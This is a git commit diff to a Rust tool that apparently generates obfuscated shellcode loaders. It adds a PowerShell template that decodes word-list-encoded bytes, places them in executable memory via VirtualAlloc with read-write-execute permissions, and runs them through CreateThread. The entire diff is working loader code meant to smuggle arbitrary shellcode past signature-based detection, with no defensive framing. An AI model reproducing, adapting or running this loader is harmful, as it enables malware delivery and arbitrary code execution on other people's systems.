2e828575eb96e52a05974f81274e26423000c215
Ext-DASH <133534703+Ext-DASH@users.noreply.github.com>
2024-12-09 13:50:07 -0700

    Added powershell template

--- src/main.rs
+++ src/main.rs
@@ -218,6 +218,65 @@ fn main() {{
             encoded_str,
             wordlist_str
         ),
+        "powershell" => format!(
+            r#"
+            $VrtAlloc = @"
+            using System;
+            using System.Runtime.InteropServices;
+
+            public class VrtAlloc {{
+                [DllImport("kernel32")]
+                public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
+            }}
+"@
+
+            Add-Type $VrtAlloc 
+
+            $WaitFor= @"
+            using System;
+            using System.Runtime.InteropServices;
+
+            public class WaitFor{{
+            [DllImport("kernel32.dll", SetLastError=true)]
+                public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
+        }}
+"@
+
+            Add-Type $WaitFor
+
+            $CrtThread= @"
+            using System;
+            using System.Runtime.InteropServices;
+
+            public class CrtThread{{
+            [DllImport("kernel32", CharSet=CharSet.Ansi)]
+                public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+            
+            }}
+"@
+            Add-Type $CrtThread   
+
+            $encoded = @({})
+            $word_list = @({})
+
+            [Byte[]] $buf = @()
+
+            foreach ($word in $encoded) {{
+                for ($i = 0; $i -lt $word_list.Count; $i++) {{
+                    if ($word_list[$i] -eq $word) {{
+                        $buf += [byte]$i
+                        break
+                    }}
+                }}
+            }}
+            [IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
+            [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
+            $thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
+            [WaitFor]::WaitForSingleObject($thandle, [uint32]'0xFFFFFFFF')
+            "#,
+            encoded_str,
+            wordlist_str
+        ),
         _ => panic!("Unsupported template")
     }
 
